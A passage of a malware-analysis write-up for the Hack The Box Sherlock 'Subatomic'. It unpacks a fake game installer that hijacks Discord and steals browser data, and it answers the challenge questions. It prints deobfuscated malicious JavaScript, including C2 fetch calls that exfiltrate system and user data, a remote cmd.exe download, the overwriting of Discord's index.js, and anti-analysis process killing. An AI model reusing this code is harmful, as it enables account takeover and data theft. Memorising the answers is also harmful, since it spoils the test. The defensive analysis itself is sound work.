---
title: HTB Sherlock: Subatomic
url: https://0xdf.gitlab.io/2024/04/18/htb-sherlock-subatomic.html
date: 2024-04-18T09:00:00+00:00
difficulty: Medium
tags: ctf, hackthebox, htb-sherlock, forensics, sherlock-subatomic, sherlock-cat-malware-analysis, malware, dfir, nullsoft, electron, nsis, authenticode, imphash, python-pefile, virus-total, 7z, nsi, asar, npm, nodejs, vscode, nodejs-debug, deobfuscation, duvet, discord, browser, htb-atom, htb-unobtainium
---

![Subatomic](/icons/sherlock-subatomic.png)

Subatomic looks at a real piece of malware written in Electron, designed as a fake game installer that will hijack the system’s Discord installation as well as exfil data about the machine, and Discord tokens, and tons of browser data. I’ll take apart the malware to see what it does and answer the questions for the challenge.

## Challenge Info

| Name | [Subatomic](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fsubatomic)  [Subatomic](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fsubatomic) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fsubatomic) |
| --- | --- |
| Release Date | 11 April 2024 |
| Retire Date | 11 April 2024 |
| Difficulty | Medium |
| Category | Malware Analysis Malware Analysis |
| Creator | [CyberRaiju CyberRaiju](https://app.hackthebox.com/users/10636) |

## Background

### Scenario

> Forela is in need of your assistance. They were informed by an employee that their Discord account had been used to send a message with a link to a file they suspect is malware. The message read: “Hi! I’ve been working on a new game I think you may be interested in it. It combines a number of games we like to play together, check it out!”. The Forela user has tried to secure their Discord account, but somehow the messages keep being sent and they need your help to understand this malware and regain control of their account!

> Warning:
>
> This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments.
>
> One the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed.

Notes from the scenario:
- Discord account has been hacked.
- Lure seems to be gaming related.
- Real malware involved here.

### Questions

To solve this challenge, I’ll need to answer the following 13 questions:
1. What is the Imphash of this malware installer?
2. The malware contains a digital signature. What is the program name specified in the `SpcSpOpusInfo` Data Structure?
3. The malware uses a unique GUID during installation, what is this GUID?
4. The malware contains a package.json file with metadata associated with it. What is the ‘License’ tied to this malware?
5. The malware connects back to a C2 address during execution. What is the domain used for C2?
6. The malware attempts to get the public IP address of an infected system. What is the full URL used to retrieve this information?
7. The malware is looking for a particular path to connect back on. What is the full URL used for C2 of this malware?
8. The malware has a configured `user_id` which is sent to the C2 in the headers or body on every request. What is the key or variable name sent which contains the user\_id value?
9. The malware checks for a number of hostnames upon execution, and if any are found it will terminate. What hostname is it looking for that begins with `arch`?
10. The malware looks for a number of processes when checking if it is running in a VM; however, the malware author has mistakenly made it check for the same process twice. What is the name of this process?
11. The malware has a special function which checks to see if `C:\Windows\system32\cmd.exe` exists. If it doesn’t it will write a file from the C2 server to an unusual location on disk using the environment variable `USERPROFILE`. What is the location it will be written to?
12. The malware appears to be targeting browsers as much as Discord. What command is run to locate Firefox cookies on the system?
13. To finally eradicate the malware, Forela needs you to find out what Discord module has been modified by the malware so they can clean it up. What is the Discord module infected by this malware, and what’s the name of the infected file?

### Tools

To look at this malware, I’ll use the following tools:
- 7zip - The malware is a NullSoft installer for an Electron app, so there are multiple layers of executable archives that 7z will extract for me.
- VirusTotal - The site is very useful for providing hashes and signature data.
- Python - Specific modules, [Signify](https://signify.readthedocs.io/en/latest/authenticode.html) for authenticode analysis and [pefile](https://github.com/erocarrera/pefile) for import hashing.
- `npm` - I’ll need `npm` to install NodeJS modules both for use, and to get dynamic analysis working.
- `asar` - A NodeJS tool for extracting ASAR (electron) applications.
- Visual Studio Code - Nice debug environment for NodeJS, and nice editor to provide syntax highlighting for code analysis.

### Data

The zip file has a `DANGER.txt` and another zip:

```

oxdf@hacky$ unzip -l subatomic.zip 
Archive:  subatomic.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 78037116  2024-04-02 04:40   malware.zip
     1046  2024-04-02 04:39   DANGER.txt
---------                     -------
 78038162                     2 files

```

The `DANGER.txt` file has warnings that this is real malware, as well as the password to unzip `malware.zip`. That has a single Windows executable:

```

oxdf@hacky$ unzip malware.zip 
Archive:  malware.zip
[malware.zip] nsis-installer.exe password: 
  inflating: nsis-installer.exe  
oxdf@hacky$ file nsis-installer.exe 
nsis-installer.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive

```

It’s a Nullsoft Installer self-extracting archive, which suggests it’s actually a Zip archive as well, but one with some code such that if it’s run, it will extract the files into specific places. The name matches that, as NSIS is short for [Nullsoft Scriptable Install System](https://nsis.sourceforge.io/Main_Page).

## File Metadata Analysis

### Why

When analyzing malware, it’s useful to collect information about the file itself. Digital signature information is useful for understanding the social-engineering aspect of the malware - How does it convince a user to execute it? Legit signatures from legit companies give credibility to the malware and help it to bypass both initial inspection and incident response. Even invalid signatures are sometimes used as they may trick a less technical user.

Hashes are a way of describing malware samples. Standard hashing algorithms such as MD5 and SHA provide a single fingerprint for an exact file. Other hashing techniques such as Import hashing (Imphash) and fuzzy hashes allow identifying files that are very similar with some amount of change. Malware analysis can be a very difficult and time-intensive process, so if analysis of the same of similar files can be identified, that can save a lot of time.

### Binary Details

On Windows, right clicking on a binary and selecting “Properties” will load the Properties window. The “Details” tab gives information about the binary:

![image-20240416082752548](/img/image-20240416082752548.png)

It’s interesting that this claims to be “SerenityTherapyInstaller”, and the Copyright is similar.

### Signature

#### General

Digital signatures are given to binaries to give them a sense of being verified by the signer. On Windows, Microsoft offers the [Authenticode](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/authenticode) program. This information is in the “Digital Signatures” tab in Properties:

![image-20240416081634166](/img/image-20240416081634166.png)

Clicking on the signature and then “Details” shows details:

![image-20240416081707583](/img/image-20240416081707583.png)

I can see here that this one is not valid (probably something that should be more prominently displayed sooner). That means the hash in the signature doesn’t match the hash of the file.

This can also be seen with PowerShell’s `Get-AuthenticodeSignature` commandlet:

```

PS > Get-AuthenticodeSignature .\nsis-installer.exe | fl

SignerCertificate      : [Subject]
                           CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                         [Issuer]
                           CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                         [Serial Number]
                           33000002CBB77539FB027142360000000002CB

                         [Not Before]
                           5/12/2022 4:45:59 PM

                         [Not After]
                           5/11/2023 4:45:59 PM

                         [Thumbprint]
                           F372C27F6E052A6BE8BAB3112B465C692196CD6F

TimeStamperCertificate : [Subject]
                           CN=Microsoft Time-Stamp Service, OU=Thales TSS ESN:D9DE-E39A-43FE, OU=Microsoft Operations Puerto Rico, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                         [Issuer]
                           CN=Microsoft Time-Stamp PCA 2010, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

                         [Serial Number]
                           33000001AC66BC87225DDE3D7B0001000001AC

                         [Not Before]
                           3/2/2022 1:51:29 PM

                         [Not After]
                           5/11/2023 2:51:29 PM

                         [Thumbprint]
                           B11AD213B0B8B049FDE803218CD9176746358AA0

Status                 : HashMismatch
StatusMessage          : The contents of file Z:\hackthebox-sherlocks\subatomic\nsis-installer.exe might have been changed by an unauthorized user or process, because the hash of the file does not match the hash stored in the digital signature. The script cannot run
                         on the specified system. For more information, run Get-Help about_Signing.
Path                   : Z:\hackthebox-sherlocks\subatomic\nsis-installer.exe
SignatureType          : Authenticode
IsOSBinary             : False

```

The fact that this signature is invalid is suspicious, though doesn’t necessarily mean it’s malicious. But the fact that it doesn’t line up with the binary details is very suspicious. My best guess at this point is that the malware authors took the signature section from a legit Windows binary and attached it to their binary.

#### SpcSpOpusInfo

To dig a bit deeper into the signature, there’s a data structure in the Authenticode data called `SpcSpOpusInfo` (defined on page 11 of the [Authenticode specification](https://view.officeapps.live.com/op/view.aspx?src=https%3A%2F%2Fdownload.microsoft.com%2Fdownload%2F9%2Fc%2F5%2F9c5b2167-8017-4bae-9fde-d599bac8184a%2FAuthenticode_PE.docx)). It represents data attached to the binary that is also signed (so it can’t be modified without breaking the signature). It includes two fields, `programName` and `moreInfo`.

The easiest way to see this kind of data is though VirusTotal (see [next section]), but it can also be done with Python. The [Signify](https://signify.readthedocs.io/en/latest/authenticode.html) Python package has a way to do this, and it’s on the examples page (this is in a Python console, but could also just write a script):

```

>>> from signify.authenticode import SignedPEFile
>>> with open("nsis-installer.exe", "rb") as f:
...     pefile = SignedPEFile(f)
...     for signed_data in pefile.signed_datas:
...         print(signed_data.signer_info.program_name)
...         if signed_data.signer_info.countersigner is not None:
...             print(signed_data.signer_info.countersigner.signing_time)
...
Windows Update Assistant
2022-09-22 22:35:06.741000+00:00

```

“Windows Update Assistant” (Task 2) is the program name, which adds more weight to the idea that this signature section was stolen from a legit Windows binary.

### Hashes

There are many types of “hashes” that come up in malware analysis. For more detail on many of them, check out this [awesome article from Karsten Hahn](https://www.gdatasoftware.com/blog/2021/09/an-overview-of-malware-hashing-algorithms) (who also creates the amazing [Malware Analysis for Hedgehogs YouTube channel](https://www.youtube.com/c/MalwareAnalysisForHedgehogs)). I’ll look at cryptographic hashes and ImpHash here for this challenge.

#### Cryptographic Hashes

Cryptographic hashes are the famous algorithms like MD5, SHA-1, SHA-256. These make a unique fingerprint for a given binary, and (to a very high statistical probability), are unlikely to give the same fingerprint for two different files.

Older, shorter hashes like MD5 do have some attacks out there that allow an attacker to generate multiple files with the same hash, but it isn’t something that’s been deployed against malware researches to my knowledge at the time of this writing.

I can collect these on Linux easily:

```

oxdf@hacky$ md5sum nsis-installer.exe 
85aea19a596f59d0dbf368f99be6a139  nsis-installer.exe
oxdf@hacky$ sha1sum nsis-installer.exe 
9fd84c0780b6555cdeed499b30e5d67071998fbc  nsis-installer.exe
oxdf@hacky$ sha256sum nsis-installer.exe 
7a95214e7077d7324c0e8dc7d20f2a4e625bc0ac7e14b1446e37c47dff7eeb5b  nsis-installer.exe

```

Or on Windows:

```

PS > Get-FileHash -Algorithm MD5 .\nsis-installer.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             85AEA19A596F59D0DBF368F99BE6A139                                       Z:\hackthebox-sherlocks\subatomic\nsis-installer.exe

PS > Get-FileHash -Algorithm SHA1 .\nsis-installer.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA1            9FD84C0780B6555CDEED499B30E5D67071998FBC                               Z:\hackthebox-sherlocks\subatomic\nsis-installer.exe

PS > Get-FileHash -Algorithm SHA256 .\nsis-installer.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          7A95214E7077D7324C0E8DC7D20F2A4E625BC0AC7E14B1446E37C47DFF7EEB5B       Z:\hackthebox-sherlocks\subatomic\nsis-installer.exe

```

When doing malware analysis, I would throw each of these into an internet search:

![image-20240416113822015](/img/image-20240416113822015.png)

This gives me insight into what others have already seen about this binary.

#### ImpHash

The import hash (or ImpHash) was first [introduced by Mandiant](https://cloud.google.com/blog/topics/threat-intelligence/tracking-malware-import-hashing/) over ten years ago in January 2014. The idea is to hash the PE import table, and that that provides a fingerprint for files developed from the same codebase. [Malware Analysis for Hedgehogs](https://youtu.be/fWV8Dh_RBZU) has a nice explainer video.

Calculating this can be done easily with Python:

```

>>> import pefile
>>> pe = pefile.PE('nsis-installer.exe')
>>> pe.get_imphash()
'b34f154ec913d2d2c435cbd644e91687'

```

So the ImpHash for this malware installer is b34f154ec913d2d2c435cbd644e91687 (Task 1).

### VirusTotal

There are many sandboxes out there, and if they come up in an internet search for the hash, I will typically check them out. But the one I check on my own is VirusTotal. I can upload my sample there, but it’s always best to start with a search for one of the cryptographic hashes. For CTF challenges it’s fine to upload the binary if the hash isn’t found, but in a professional setting make sure that is allowed and a good idea (as actors will watch for their stuff to show up in VT).

![image-20240416120558506](/img/image-20240416120558506.png)

VT is most well known for giving the results of scanning the file with many (65 here) antivirus engines. A couple weeks ago, this was 1/65. It seems the AV vendors are adapting to catch this sample.

On the “Details” tab, there’s a ton of information. The various hashes are here (Task 1 again):

![image-20240416120823882](/img/image-20240416120823882.png)

And Signature information (Task 2 again):

![image-20240416120919424](/img/image-20240416120919424.png)

## Recover JavaScript

### Background

The original file is a “Nullsoft Installer self-extracting archive”. That typically means that it’s a Zip file with some code that knows what to pull out of the archive, where to put it, and what to run once it’s unpacked.

I’ve looked at this kind of file a few times before, first in the [2020 SANS Holiday Hack](/holidayhack2020/3#point-of-sale-password-recovery), then in [HTB Atom](/2021/07/10/htb-atom.html#heed-re) and [HTB Unobtainium](/2021/09/04/htb-unobtainium.html#package-re).

### Unpacking #1 [Fail]

I’ll start working in a Linux VM as I’m comfortable there and there’s less risk of accidentally double-clicking and infecting myself (though I am using a VM snapshot to before this analysis so reverting wouldn’t be the end of the world).

`7z` is able to list the files in the archive:

```

oxdf@hacky$ 7z l nsis-installer.exe

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,8 CPUs AMD Ryzen 9 5900X 12-Core Processor             (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 78057262 bytes (75 MiB)

Listing archive: nsis-installer.exe
--
Path = nsis-installer.exe
Type = PE
Physical Size = 78057262
CPU = x86
Characteristics = Executable 32-bit NoRelocs NoLineNums NoLocalSyms
Created = 2018-12-15 18:26:14
...[snip]...

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
                    .....                      6931  $PLUGINSDIR/System.dll
                    .....                     45608  $PLUGINSDIR/StdUtils.dll
                    .....                      4615  $PLUGINSDIR/SpiderBanner.dll
                    .....                      3299  $PLUGINSDIR/nsExec.dll
2024-03-31 07:02:26 .....     77543897     77543897  $PLUGINSDIR/app-32.7z
                    .....                    242382  $PLUGINSDIR/nsis7z.dll
2024-03-31 07:02:30 .....                    114363  $R0/Uninstall SerenityTherapyInstaller.exe
                    .....                      1080  $PLUGINSDIR/WinShell.dll
------------------- ----- ------------ ------------  ------------------------
2024-03-31 07:02:30           77543897     77962175  8 files

```

Most of those files are part of the Nullsoft installer. The interesting stuff is in `app-32.7z` (though hiding malware in a trojanized “standard” dll would be a nice trick).

But there’s a file missing here! If I open the file in the OS archive manager, it shows the same thing:

![image-20240416152416720](/img/image-20240416152416720.png)

I’ll move to my Linux host and have the same issue:

![image-20240416152538031](/img/image-20240416152538031.png)

I’ll move to a Windows VM.

### Unpacking #1 [Success]

On Windows, I’ll right-click, “7-Zip” –> “Open archive”:

![image-20240416152711121](/img/image-20240416152711121.png)

I can’t explain why this fails on Linux, but there is an extra file here, `[NSIS].nsi`. It’s not clear to me if 7zip on Windows has an extra plugin by default, or if it gets installed when I install [Flare-VM](https://github.com/mandiant/flare-vm), or if it is just different from Linux. Still, good to know for the future.

I’ll drag these files into a folder, `nullsoft_unpack`.

### Files Analysis

The `.nsi` file is part of the NullSoft installer, and has instructions about the install process. It’s a text file with 2490 lines.

The first 1375 lines are defining different strings in different languages:

![image-20240416153415536](/img/image-20240416153415536.png)

Then there are variables and functions in this assembly-like language:

![image-20240416153359698](/img/image-20240416153359698.png)

A lot of these functions are running `ReadRegStr` and `WriteRegStr` to interact with the register, and a lot of the keys reference the GUID “cfbc383d-9aa0-5771-9485-7b806e8442d5” (Task 3). This is another indicator of compromise. In fact, searching for it finds a single result, an [Any.run sandbox page](https://any.run/report/7a95214e7077d7324c0e8dc7d20f2a4e625bc0ac7e14b1446e37c47dff7eeb5b/5d675687-5711-4900-b5e9-13bc0c33c8b2) for this malware:

![image-20240416153707332](/img/image-20240416153707332.png)

At the bottom of the file, it extracts `$PLUGINSDIR\app-$_38_.7z` (earlier in the file `$_38_` was set to 32):

![image-20240416154203035](/img/image-20240416154203035.png)

`$R0` has a single file, `Uninstall SerenityTherapyInstaller.exe`. This is the uninstaller registered to run when the game is uninstalled, though there’s no reason this couldn’t be malware as well.

`$PLUGINSDIR` has some `.dlls` and the `app-32.7z` file:

![image-20240416154430644](/img/image-20240416154430644.png)

### Unpacking #2

Staying in Windows, I’ll open the `app-32.7z` file and unpack it into another folder.

![image-20240416154748049](/img/image-20240416154748049.png)

There are many binaries here that could be worth investigating. I’ll want to start with the interesting Electron stuff is, which is in the `app.asar` file in the `resources` folder.

### Recover JavaScript

From here, I’ll use the Node `asar` tool to recover the scripts from the `.asar` file. To install these on Linux, I’ll run `npm install -g --engine-strict asar`, and that makes the `asar` command available to the system.

The `asar l app.asar` command will list all the files in the archive:

```

PS > (asar l .\app.asar | Measure-Object -Line).Lines
1421
PS > asar l .\app.asar | Select-Object -First 10
\app.js
\package.json
\node_modules
\node_modules\agent-base
\node_modules\agent-base\package.json
\node_modules\agent-base\src
\node_modules\agent-base\src\index.ts
\node_modules\agent-base\src\promisify.ts
\node_modules\agent-base\dist
\node_modules\agent-base\dist\src

```

There are over 1,400! All but two of them are in the `node_modules` directory:

```

PS > asar l .\app.asar | Select-String -NotMatch "^\\node_modules"

\app.js
\package.json

```

I’ll extract all of these into a new directory:

```

PS > mkdir extracted_asar2

    Directory: Z:\hackthebox-sherlocks\subatomic

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/17/2024   1:11 PM                extracted_asar2

PS > asar e .\extracted_app32\resources\app.asar .\extracted_asar2\
PS > ls .\extracted_asar2\

    Directory: Z:\hackthebox-sherlocks\subatomic\extracted_asar2

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         4/17/2024   1:11 PM                node_modules
------         4/17/2024   1:11 PM            340 package.json
------         4/17/2024   1:11 PM         303138 app.js

```

`package.json` has metadata about the package, including the license of “ISC” (Task 4):

```

{
  "name": "SerenityTherapyInstaller",
  "version": "1.0.0",
  "main": "app.js",
  "nodeVersion": "system",
  "bin": "app.js",
  "author": "SerenityTherapyInstaller Inc",
  "license": "ISC",
  "dependencies": {
    "@primno/dpapi": "1.1.1",
    "node-addon-api": "^7.0.0",
    "sqlite3": "^5.1.6",
    "systeminformation": "^5.21.22"
  }
}

```

### Deobfuscate JavaScript

#### Static Analysis

The resulting file is one very long line:

```

oxdf@hacky$ wc extracted_asar/app.js 
     0    725 303138 extracted_asar/app.js

```

Only 725 words, but over three hundred thousand characters. It is heavily obfuscated (easily seen in VSCode):

![image-20240416164635515](/img/image-20240416164635515.png)

Given the size, it’s not worth trying to unwind this statically. I did try to replace all “;” with newlines, but there’s a giant block of encrypted or encoded data in the middle with “;” that are not JavaScript command breaks and it breaks the entire thing.

#### Dynamic

In VSCode, I’ll try to debug this file. This is a good time to remember that I’m in a VM and to have a clean snapshot I can revert to. I’ll want to be in my Windows VM as well, as this program is designed to run on Windows (I don’t believe the dpapi Node module will install on Linux).

I’ll go to the Debug tab and push “Run and Debug”. It loads a console which errors out:

![image-20240416165425341](/img/image-20240416165425341.png)

There is some issue with the version of `@primno/dpapi` installed. I’ll delete the folder in `node_modules` and reinstalled it with `npm`:

```

PS > del .\node_modules\@primno\

Confirm
The item at Z:\hackthebox-sherlocks\subatomic\extracted_asar\node_modules\@primno\ has children and the Recurse parameter was not specified. If you continue, all children will be removed with the item. Are you sure you want 
to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): A
PS > npm install @primno/dpapi

added 1 package, removed 9 packages, changed 13 packages, and audited 129 packages in 5s

13 packages are looking for funding
  run `npm fund` for details

1 moderate severity vulnerability

To address all issues, run:
  npm audit fix

Run `npm audit` for details.

```

I’ll run again, and this time it errors out at the `sqlite3` module:

![image-20240416165736202](/img/image-20240416165736202.png)

Same trick to get an updated version:

```

PS > del .\node_modules\sqlite3\

Confirm
The item at Z:\hackthebox-sherlocks\subatomic\extracted_asar\node_modules\sqlite3\ has children and the Recurse parameter was not specified. If you continue, all children will be removed with the item. Are you sure you want 
to continue?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "Y"): A
PS > npm install sqlite3

added 1 package, and audited 129 packages in 2s

13 packages are looking for funding
  run `npm fund` for details

1 moderate severity vulnerability

To address all issues, run:
  npm audit fix

Run `npm audit` for details.

```

Now when I run, it starts. I want to hit the pause button as quickly as possible:

![image-20240416165934505](/img/image-20240416165934505.png)

If it gets too far into the program, it won’t break. This is tricky. For me the easiest thing to do was push F5 to start, and then immediately start jamming F6 to pause. It would typically pause, and I could look for interesting stuff in the call stack. Specifically, stuff like this:

![image-20240416171326300](/img/image-20240416171326300.png)

This is `<anonymous>` (meaning it doesn’t have a file associated with it) and it’s coming form an `eval` statement, which makes perfect sense coming out of the obfuscated code. If I pause too late, it won’t break, and I’ll kill the process and start over. If I pause too early, it will not have the extracted code running. In that case, I’ll quickly F5 to start immediately followed by F6 to pause and see if anything is out yet, repeating until I get the anonymous file. Clicking on that opens up a temp file with 894 lines of nicely deobfuscated JavaScript:

![image-20240416171449969](/img/image-20240416171449969.png)

## JavaScript Analysis

### Overview

There are a lot of functions here, which are visible in the “Outline” view in VSCode. I’ll color code them into three categories:

![image-20240416204750871](/img/image-20240416204750871.png)

There’s also imports at the top for the 3rd party packages:

```

const { execSync, exec } = require('child_process');
const { Dpapi } = require('@primno/dpapi');
const { join } = require('path');
const { createDecipheriv, createCipheriv } = require('crypto');
const { totalmem, cpus, userInfo, uptime, hostname } = require('os');
const { existsSync, readdirSync, readFileSync, statSync, writeFileSync, copyFileSync } = require('fs');

const si = require('systeminformation');
const { Database } = require('sqlite3');

```

And configuration data:

```

const options = {
    api: 'https://illitmagnetic.site/api/',
    user_id: '6270048187',
    logout_discord: 'false'
};

```

`api` is likely the C2 server that’s in use, `https://illitmagnetic.site/api/` (Task 5 and Task 7). There are 20 occurrences of the string “options.api”, and all 20 are proceeded by “fetch(“.

### General

#### <function>

`<function>` is a function that defines itself and then calls itself in a very JavaScript way:

```

(async() => {
...[snip]...
})();

```

Inside there are three `try` / `catch` blocks, each with the same `catch` except for the error message is slightly different:

```

    try {
...[snip]...
    } catch(e) {
        await fetch(options.api + 'errors', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                duvet_user: options?.user_id,
                computer_name: userInfo()?.username,
                data: {
                    error: `Error from Injection: ${e}`
                }
            })
        });
    };

```

The first block calls three functions, and the other two call one each:
1. `checkVm`, `checkCmdInstallation`, and `newInjection`
2. `getDiscordTokens`
3. `allBrowserData`

#### checkVm

There’s a function called `checkVM`:

```

function checkVm() {
    if(Math.round(totalmem() / (1024 * 1024 * 1024)) < 2) process.exit(1);
    if([
        'bee7370c-8c0c-4', 'desktop-nakffmt', 'win-5e07cos9alr', 'b30f0242-1c6a-4', 'desktop-vrsqlag', 'q9iatrkprh', 'xc64zb',
        'desktop-d019gdm', 'desktop-wi8clet', 'server1', 'lisa-pc', 'john-pc', 'desktop-b0t93d6', 'desktop-1pykp29', 'desktop-1y2433r',
        'wileypc', 'work', '6c4e733f-c2d9-4', 'ralphs-pc', 'desktop-wg3myjs', 'desktop-7xc6gez', 'desktop-5ov9s0o', 'qarzhrdbpj',
        'oreleepc', 'archibaldpc', 'julia-pc', 'd1bnjkfvlh', 'compname_5076', 'desktop-vkeons4', 'NTT-EFF-2W11WSS', 'aranmoo', 'kathlcox', 'rotembarne', 'bilawson', 'seanwalla', 'gugonzal', 'zachwood', 'theresap', 'joyedwar', 'richar', 'dburns', 'willipe'
    ].includes(hostname().toLowerCase())) process.exit(1);

    const tasks = execSync('tasklist');
    [
        'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'
    ].forEach((task) => {
        if(tasks.includes(task))
        execSync(`taskkill /f /im ${task}.exe`);
    });
};

```

First it checks that the total memory is greater than 2GB and that the hostname isn’t in a specific list, exiting if either check fails. Then it loops over a list of forensics tools and if any are in the tasklist, it tries to kill that process.

The hostname that starts with “arch” is “archibaldpc” (Task 9). The process check does check for one process twice. To find this I’ll use some Bash foo:

```

oxdf@hacky$ echo "'opera', 'fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd',
        'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg',
        'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver',
        'vmwareservice', 'vmwaretray', 'discordtokenprotector'" |
> tr ', ' '\n' | grep . | sort | uniq -c | grep '      2'
      2 'vmwaretray'

```

It’s `echo`ing the list and using `tr` to replace `,`  with a newline, then `grep` to get only non-empty lines, and then `sort | uniq -c` to get a count of each value, and then `grep` to get the one with two. So the double check is `vmwaretray` (Task 10)

#### checkCmdInstallation

Next the first block calls `checkCmdInstallation`:

```

async function checkCmdInstallation() {
    return await new Promise(async(resolve) => {
        if(!existsSync('C:\\Windows\\system32\\cmd.exe')) {
            const request = await fetch(options.api + 'cmd-file', {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'duvet_user': options?.user_id
                }
            });
    
            const response = await request.json();
            writeFileSync(join(process.env.USERPROFILE, 'Documents','cmd.exe'), Buffer.from(response?.buffer), {
                flag: 'w'
            });
            process.env.ComSpec = join(process.env.USERPROFILE, 'Documents', 'cmd.exe');
            resolve();
        } else {
            process.env.ComSpec = 'C:\\Windows\\system32\\cmd.exe';
            resolve();
        };
    });
};

```

It is checking that `cmd.exe` is where it belongs in `system32`. If it is not there, then it downloads a binary from the C2 and saves it as `%USERPROFILE%\Documents\cmd.exe` (Task 11).

#### newInjection

`newInjection` is mostly about collecting information about the infected computer to send back:

```

async function newInjection() {
    const system_info = await si?.osInfo();
    const injections = await discordInjection();

    const network = await fetch('https://ipinfo.io/json', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    const network_data = await network.json();

    fetch(options.api + 'new-injection', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            duvet_user: options?.user_id,
            computer_name: userInfo()?.username,
            ram: Math.round(totalmem() / (1024 * 1024 * 1024)),
            cpu: cpus()?.[0]?.model,
            injections,
            distro: system_info?.distro,
            uptime: uptime() * 1000,
            network: {
                ip: network_data?.ip,
                country: network_data?.country,
                city: network_data?.city,
                region: network_data?.region,
            }
        })
    });
};

```

The other thing it does towards the top is call `discordInjection`, which I’ll cover in the next section.

At the top, it also makes a request to <https://ipinfo.io/json>, which returns information about the local computer’s public IP (Task 6).

When there’s POSTs of information to the C2, the `userr_id` from the configuration is sent as the `duvet_id` (Task 8).

### Discord

#### Modify App

`discordInjection` is called from `newInjection` in the first of the three blocks of main code. It loops over three folders in the AppData directory, `Discord`, `DiscordCanary`, and `DiscordPTB`:

```

async function discordInjection() {
    const infectedDiscords = [];

    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
    ?.forEach(async(dir) => {
...[snip]...
    });

    return infectedDiscords;
};

```

For each, if it exists, it looks for a folder starting with `app-`, and in it `modules` and in that `discord_desktop_core-1`:

```

        if(existsSync(dir)) {
            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();

```

If that exists, it adds it to the `infectedDiscords` list and requests a new replacement file from the C2, writing it over the original `index.js` file:

```

            
            if(discord_index) infectedDiscords?.push(
                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
            );

            const request = await fetch(options.api + 'injections', {
                method: 'GET',
                headers: {
                    duvet_user: options?.user_id,
                    logout_discord: options?.logout_discord
                }
            });

            const data = await request.json();

            writeFileSync(discord_index, data?.discord, {
                flag: 'w'
            });

```

Then it kills and restarts the current discord process:

```

            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
                if(err) {};
            });

```

The victim better clean up the discord\_desktop\_core-1 module’s `index.js` (Task 13). Checking on a Windows machine of mine that has Discord installed, the main application seems to be installed at `%APPDATA%\Local\Discord\app-1.0.9041`. In that directory, there’s a `modules` directory:

![image-20240417132149295](/img/image-20240417132149295.png)

A couple directories down is `index.js`:

![image-20240417132239112](/img/image-20240417132239112.png)

The non-trojaned `index.js` is a single line to load the ASAR file:

```

module.exports = require('./core.asar');

```

I wasn’t able to get a copy of the one that the malware C2 deploys, as `illitmagnetic.site` is down as of the time of my analysis.

#### Collect Tokens From App

The second block called in the main function calls `getDiscordTokens`. It starts by making a request to the C2 for a list of paths:

```

    const request = await fetch(options.api + 'paths', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json',
            'duvet_user': options.user_id
        }
    });

```

Then it loops over these paths, looking for `.ldb` (leveldb) and `.log` files:

```

